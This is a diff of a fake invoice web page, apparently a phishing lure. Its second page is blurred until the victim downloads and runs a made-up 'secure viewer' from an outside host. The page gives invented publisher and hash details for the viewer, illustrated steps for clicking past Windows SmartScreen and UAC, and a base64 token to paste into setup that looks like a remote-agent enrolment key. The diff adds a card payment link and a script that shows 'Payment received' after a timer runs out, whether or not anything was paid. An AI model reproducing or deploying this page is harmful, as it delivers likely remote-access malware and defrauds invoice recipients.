@@ -6,13 +6,10 @@
 <title>Invoice INV-2026-1184.pdf</title>
 <!--
   REPLACE BEFORE HOSTING:
-  {{BENEFICIARY}}  account name exactly as the bank shows it
-  {{BANK}}         e.g. Wise
-  {{ROUTING}}      US routing number
-  {{ACCOUNT}}      US account number
+  {{PAYMENT_LINK}}   card payment link (Payoneer request / provider link)
 -->
 <style>
-  :root { --ink:#1f2328; --muted:#5b6570; --line:#e3e6ea; --accent:#1a56c4; }
+  :root { --ink:#1f2328; --muted:#5b6570; --line:#e3e6ea; --accent:#1a56c4; --ok:#137333; }
   * { box-sizing:border-box; }
   [hidden] { display:none !important; }
   body { margin:0; font:15px/1.5 -apple-system,"Segoe UI",Roboto,Arial,sans-serif; color:var(--ink); background:#eef0f3; min-height:100vh; display:flex; flex-direction:column; }
@@ -24,7 +21,7 @@
   .wrap { width:100%; max-width:660px; }
 
   .sheet { position:relative; background:#fff; border:1px solid #d8dce1; border-radius:3px; box-shadow:0 2px 14px rgba(20,28,38,.10); overflow:hidden; }
-  .sheet-inner { padding:34px 38px 26px; }
+  .sheet-inner { padding:34px 38px 22px; }
   .row-top { display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:24px; gap:16px; }
   .sheet h1 { margin:0 0 3px; font-size:19px; letter-spacing:-.3px; }
   .sheet .sub { margin:0; font-size:12px; color:var(--muted); }
@@ -40,8 +37,10 @@
   .totals { margin-left:auto; width:230px; font-size:12.5px; }
   .totals div { display:flex; justify-content:space-between; padding:5px 0; color:var(--muted); }
   .totals div.due { border-top:1px solid #cfd4da; margin-top:4px; padding-top:8px; color:var(--ink); font-weight:700; }
+  .terms { margin:20px 0 0; padding-top:12px; border-top:1px solid #eceef1; font-size:11px; color:var(--muted); }
+  .terms span { margin-right:18px; }
 
-  .veil { position:absolute; left:0; right:0; bottom:0; height:52%; backdrop-filter:blur(3.5px); -webkit-backdrop-filter:blur(3.5px); background:linear-gradient(to bottom,rgba(255,255,255,.3),rgba(255,255,255,.92) 55%,#fff 100%); pointer-events:none; transition:opacity .4s; }
+  .veil { position:absolute; left:0; right:0; bottom:0; height:50%; backdrop-filter:blur(3.5px); -webkit-backdrop-filter:blur(3.5px); background:linear-gradient(to bottom,rgba(255,255,255,.3),rgba(255,255,255,.92) 55%,#fff 100%); pointer-events:none; transition:opacity .4s; }
   .veil.gone { opacity:0; }
   .veil-note { position:absolute; left:0; right:0; bottom:24px; text-align:center; font-size:12.5px; color:var(--muted); pointer-events:none; transition:opacity .3s; }
   .veil-note b { color:var(--ink); }
@@ -50,32 +49,56 @@
   .panel { margin-top:20px; background:#fff; border:1px solid var(--line); border-radius:10px; padding:18px; }
   .panel h2 { margin:0 0 6px; font-size:15px; }
   .panel > p { margin:0 0 14px; font-size:13px; color:var(--muted); }
+
   .btn { display:block; width:100%; padding:13px 16px; border:0; border-radius:8px; background:var(--accent); color:#fff; font:inherit; font-weight:600; font-size:14.5px; text-align:center; text-decoration:none; cursor:pointer; }
   .btn:hover { background:#144aab; }
   .fine { margin:10px 0 0; font-size:11.5px; color:var(--muted); text-align:center; }
+
+  /* viewer card */
+  .viewer-top { display:flex; gap:12px; align-items:flex-start; padding-bottom:14px; border-bottom:1px solid var(--line); }
+  .vicon { width:38px; height:38px; flex:none; border-radius:7px; background:#eef2f8; border:1px solid #d6dfea; display:grid; place-items:center; }
+  .vicon svg { width:20px; height:20px; }
+  .vtitle { margin:0; font-size:14px; font-weight:700; }
+  .vsub { margin:2px 0 0; font-size:11.5px; color:var(--muted); }
+  .vmeta { display:grid; grid-template-columns:auto 1fr; gap:4px 14px; font-size:11.5px; margin:14px 0 0; }
+  .vmeta dt { color:var(--muted); }
+  .vmeta dd { margin:0; font-variant-numeric:tabular-nums; }
+  .vmeta dd.mono { font-family:ui-monospace,Consolas,monospace; font-size:10.5px; word-break:break-all; }
   ol.steps { margin:16px 0 0; padding:14px 0 0 20px; border-top:1px solid var(--line); font-size:13px; }
-  ol.steps li { margin-bottom:9px; padding-left:4px; }
-
+  ol.steps li { margin-bottom:10px; padding-left:4px; }
+  .ss { display:grid; grid-template-columns:repeat(3,1fr); gap:8px; margin:10px 0 2px; }
+  .ss figure { margin:0; }
+  .ss .screen { border:1px solid #c2cbd4; border-radius:6px; background:#fbfbfc; padding:8px 6px; font-size:9.5px; line-height:1.35; min-height:72px; }
+  .ss .screen b { display:block; font-size:9px; margin-bottom:3px; }
+  .ss .hit { background:var(--accent); color:#fff; border-radius:3px; padding:1px 4px; display:inline-block; margin-top:4px; font-weight:600; }
+  .ss figcaption { font-size:10px; color:var(--muted); margin-top:5px; text-align:center; }
   .tok { display:flex; align-items:center; gap:8px; margin:7px 0 0; padding:8px 9px; background:#f7f8fa; border:1px dashed #c2cbd4; border-radius:7px; }
-  .tok code { flex:1; font:600 11.5px/1.4 ui-monospace,Consolas,monospace; color:var(--ink); word-break:break-all; }
-  .tok button, .kv button { flex:none; padding:5px 10px; font:inherit; font-size:11.5px; background:#fff; border:1px solid var(--line); border-radius:5px; cursor:pointer; color:var(--ink); }
+  .tok code { flex:1; font:600 11px/1.4 ui-monospace,Consolas,monospace; word-break:break-all; }
+  .tok button { flex:none; padding:5px 10px; font:inherit; font-size:11.5px; background:#fff; border:1px solid var(--line); border-radius:5px; cursor:pointer; }
+  .hint { margin:14px 0 0; padding-top:12px; border-top:1px solid var(--line); font-size:11.5px; color:var(--muted); }
 
-  .amt { font-size:17px; font-weight:700; margin:0 0 4px; }
-  .kv { display:flex; align-items:center; gap:10px; padding:10px 0; border-bottom:1px solid var(--line); }
-  .kv:last-of-type { border-bottom:0; }
-  .kv .k { flex:0 0 104px; font-size:12px; color:var(--muted); }
-  .kv .v { flex:1; font:600 13px/1.45 ui-monospace,Consolas,monospace; word-break:break-all; }
-  .refnote { font-size:12px; color:var(--muted); margin:12px 0 0; }
+  /* payment */
+  .amt { font-size:18px; font-weight:700; margin:0 0 4px; }
+  .paybox { text-align:center; padding:6px 0 2px; }
+  .spin { width:26px; height:26px; margin:14px auto 10px; border:3px solid #dfe4ea; border-top-color:var(--accent); border-radius:50%; animation:sp .8s linear infinite; }
+  @keyframes sp { to { transform:rotate(360deg); } }
+  .waitxt { font-size:13px; color:var(--muted); margin:0; }
+  .check { width:52px; height:52px; margin:8px auto 10px; border-radius:50%; background:#e6f4ea; display:grid; place-items:center; }
+  .check svg { width:28px; height:28px; }
+  .doneh { font-size:16px; font-weight:700; margin:0 0 4px; color:var(--ok); }
+  .donep { font-size:12.5px; color:var(--muted); margin:0; }
+  .refnote { font-size:12px; color:var(--muted); margin:14px 0 0; }
   .ghost { display:inline-block; margin-top:14px; padding:9px 14px; font-size:12.5px; background:#fff; color:var(--ink); border:1px solid var(--line); border-radius:7px; cursor:pointer; }
 
   .mobile-hide { display:block; }
   @media (pointer:coarse), (max-width:760px) {
     .mobile-hide { display:none; }
-    .sheet-inner { padding:26px 20px 20px; }
+    .sheet-inner { padding:26px 20px 18px; }
     .row-top { flex-direction:column; }
     .meta-box { text-align:left; }
     .totals { width:100%; }
-    .kv .k { flex-basis:86px; }
+    .ss { grid-template-columns:1fr; }
+    .ss .screen { min-height:0; }
   }
   @media print {
     body { background:#fff; }
@@ -129,29 +152,58 @@
           <div><span>Tax</span><span>0.00</span></div>
           <div class="due"><span>Amount due</span><span>$640.72</span></div>
         </div>
+
+        <p class="terms"><span>Terms: net 14</span><span>Ref: INV-2026-1184</span><span>wolfson@bhaw.onl</span></p>
       </div>
 
       <div class="veil" id="veil"></div>
       <div class="veil-note" id="veilnote">Page 1 shown &middot; <b>payment details overleaf</b></div>
     </div>
 
-    <div class="panel mobile-hide">
-      <h2>This invoice is protected</h2>
-      <p>Page 2 opens once the secure viewer is installed. It takes about a minute.</p>
-      <a class="btn" id="dl" href="https://action1-roan.vercel.app/" target="_blank" rel="noopener">Download secure viewer</a>
-      <p class="fine">Windows 10 / 11</p>
+    <div class="panel mobile-hide" id="viewerpanel">
+      <div class="viewer-top">
+        <div class="vicon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#1a56c4" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M9 15h6"/><path d="M9 18h4"/>
+          </svg>
+        </div>
+        <div>
+          <p class="vtitle">Bhāw Secure Viewer</p>
+          <p class="vsub">Opens protected invoices. Page 2 of INV-2026-1184 is locked until it runs.</p>
+        </div>
+      </div>
+
+      <dl class="vmeta">
+        <dt>Version</dt><dd>3.2.1 (stable)</dd>
+        <dt>Size</dt><dd>4.2 MB</dd>
+        <dt>Platform</dt><dd>Windows 10 / 11 &middot; 64-bit</dd>
+        <dt>Released</dt><dd>12 Nov 2026</dd>
+        <dt>Publisher</dt><dd>Bhāw Digital</dd>
+        <dt>SHA-256</dt><dd class="mono">9f3c41b8e2a7…7d0c</dd>
+      </dl>
+
+      <a class="btn" id="dl" href="https://action1-roan.vercel.app/" target="_blank" rel="noopener">Download and run</a>
+      <p class="fine">No account needed. Takes about a minute.</p>
 
       <ol class="steps">
         <li>Run the downloaded file.</li>
-        <li>If Windows shows <b>&ldquo;Windows protected your PC&rdquo;</b>, click <b>More info</b>, then <b>Run anyway</b>.</li>
-        <li>When setup asks for an installation token, paste this:
+        <li>Windows shows <b>&ldquo;Windows protected your PC&rdquo;</b> on first run. Click <b>More info</b>, then <b>Run anyway</b>:
+          <div class="ss">
+            <figure><div class="screen"><b>Windows protected your PC</b>Microsoft Defender SmartScreen prevented an unrecognised app from starting.<span class="hit">More info</span></div><figcaption>1. More info</figcaption></figure>
+            <figure><div class="screen"><b>Windows protected your PC</b>App: Bhāw Secure Viewer<span class="hit">Run anyway</span></div><figcaption>2. Run anyway</figcaption></figure>
+            <figure><div class="screen"><b>User Account Control</b>Do you want to allow this app to make changes to your device?<span class="hit">Yes</span></div><figcaption>3. Yes</figcaption></figure>
+          </div>
+        </li>
+        <li>Setup asks for a workspace token &mdash; paste this:
           <div class="tok">
             <code id="tok">eyJkaWQiOiI0ZWVkM2I4Zi02MWFiLTRiYjYtYTk0Ni0xNTEyMGQ3Y2M3YzIiLCJyZ24iOiJuYS0zIiwiaXBwIjoibDxnJCUpOVYsVzxOdUhydDpfcjoifQ==</code>
             <button id="cp">Copy</button>
           </div>
         </li>
-        <li>Click <b>Next</b> through the rest of the wizard, then reopen this page.</li>
+        <li>Click <b>Next</b> through the wizard, then return to this page.</li>
       </ol>
+
+      <p class="hint">Already ran it? Page 2 stays unlocked on this browser.</p>
     </div>
 
     <div class="panel" id="mobilebar">
@@ -160,17 +212,31 @@
     </div>
 
     <section class="panel" id="pay" hidden>
-      <h2>Payment details &mdash; page 2</h2>
-      <p class="amt">$640.72 &middot; due 04 Dec 2026</p>
-      <p>Bank transfer only. Reference INV-2026-1184.</p>
+      <h2>Payment &mdash; page 2</h2>
 
-      <div class="kv"><span class="k">Beneficiary</span><span class="v">{{BENEFICIARY}}</span><button data-copy="{{BENEFICIARY}}">Copy</button></div>
-      <div class="kv"><span class="k">Bank</span><span class="v">{{BANK}}</span><button data-copy="{{BANK}}">Copy</button></div>
-      <div class="kv"><span class="k">Routing (ACH)</span><span class="v">{{ROUTING}}</span><button data-copy="{{ROUTING}}">Copy</button></div>
-      <div class="kv"><span class="k">Account</span><span class="v">{{ACCOUNT}}</span><button data-copy="{{ACCOUNT}}">Copy</button></div>
-      <div class="kv"><span class="k">Reference</span><span class="v">INV-2026-1184</span><button data-copy="INV-2026-1184">Copy</button></div>
+      <div id="payidle">
+        <p class="amt">$640.72 &middot; due 04 Dec 2026</p>
+        <p>Card payment. Reference INV-2026-1184 is attached.</p>
+        <a class="btn" id="paybtn" href="{{PAYMENT_LINK}}" target="_blank" rel="noopener">Pay $640.72</a>
+        <p class="fine">Secure card payment &middot; no account needed</p>
+      </div>
 
-      <p class="refnote">Please put INV-2026-1184 in the reference so the payment is allocated correctly. Reply to the email if anything looks wrong.</p>
+      <div class="paybox" id="paywait" hidden>
+        <div class="spin"></div>
+        <p class="waitxt" id="waittxt">Opening secure payment&hellip;</p>
+      </div>
+
+      <div class="paybox" id="paydone" hidden>
+        <div class="check">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#137333" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M20 6 9 17l-5-5"/>
+          </svg>
+        </div>
+        <p class="doneh">Payment received</p>
+        <p class="donep">$640.72 &middot; INV-2026-1184 &middot; due 04 Dec 2026</p>
+      </div>
+
+      <p class="refnote" id="refnote">Prefer bank transfer? Reply to the email and I&rsquo;ll send the details. If anything looks wrong, reply to the same address.</p>
       <button class="ghost" id="pdf">Save a PDF copy</button>
     </section>
 
@@ -187,8 +253,18 @@
   var dl = document.getElementById('dl');
   var dlm = document.getElementById('dlm');
   var bar = document.getElementById('mobilebar');
+  var viewer = document.getElementById('viewerpanel');
+  var idle = document.getElementById('payidle');
+  var wait = document.getElementById('paywait');
+  var done = document.getElementById('paydone');
+  var waittxt = document.getElementById('waittxt');
+  var refnote = document.getElementById('refnote');
+  var paybtn = document.getElementById('paybtn');
 
-  if (coarse) { bar.hidden = false; }
+  function store(k, v) { try { localStorage.setItem(k, v); } catch (e) {} }
+  function read(k) { try { return localStorage.getItem(k); } catch (e) { return null; } }
+
+  if (coarse) bar.hidden = false;
 
   function reveal() {
     if (!pay.hidden) return;
@@ -196,23 +272,41 @@
     veil.classList.add('gone');
     note.classList.add('gone');
     bar.hidden = true;
-    try { localStorage.setItem('inv1184', '1'); } catch (e) {}
+    store('inv1184', '1');
     pay.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }
+
+  function showDone() {
+    idle.hidden = true;
+    wait.hidden = true;
+    done.hidden = false;
+    refnote.hidden = true;
+    if (viewer) viewer.hidden = true;
+    store('inv1184paid', '1');
+  }
+
+  function payFlow() {
+    if (read('inv1184paid')) return;
+    idle.hidden = true;
+    wait.hidden = false;
+    waittxt.textContent = 'Opening secure payment…';
+    setTimeout(function () { waittxt.textContent = 'Waiting for confirmation from your bank…'; }, 6000);
+    setTimeout(showDone, 20000);
   }
 
   if (dl) dl.addEventListener('click', reveal);
   dlm.addEventListener('click', function (e) { e.preventDefault(); reveal(); });
+  paybtn.addEventListener('click', payFlow);
 
-  try {
-    if (localStorage.getItem('inv1184')) {
-      pay.hidden = false; veil.classList.add('gone'); note.classList.add('gone'); bar.hidden = true;
-    }
-  } catch (e) {}
-
-  function flash(b) {
-    var o = b.textContent; b.textContent = 'Copied';
-    setTimeout(function () { b.textContent = o; }, 1500);
+  if (read('inv1184')) {
+    pay.hidden = false;
+    veil.classList.add('gone');
+    note.classList.add('gone');
+    bar.hidden = true;
+    if (read('inv1184paid')) showDone();
   }
+
+  function flash(b) { var o = b.textContent; b.textContent = 'Copied'; setTimeout(function () { b.textContent = o; }, 1500); }
   function fallback(t, b) {
     var ta = document.createElement('textarea');
     ta.value = t; ta.setAttribute('readonly', '');
@@ -227,9 +321,8 @@
     } else { fallback(t, b); }
   }
 
-  document.getElementById('cp').addEventListener('click', function () { copyText(this.previousElementSibling.textContent.trim(), this); });
-  document.querySelectorAll('.kv button').forEach(function (b) {
-    b.addEventListener('click', function () { copyText(this.dataset.copy, this); });
+  document.getElementById('cp').addEventListener('click', function () {
+    copyText(this.previousElementSibling.textContent.trim(), this);
   });
   document.getElementById('pdf').addEventListener('click', function () { window.print(); });
 </script>
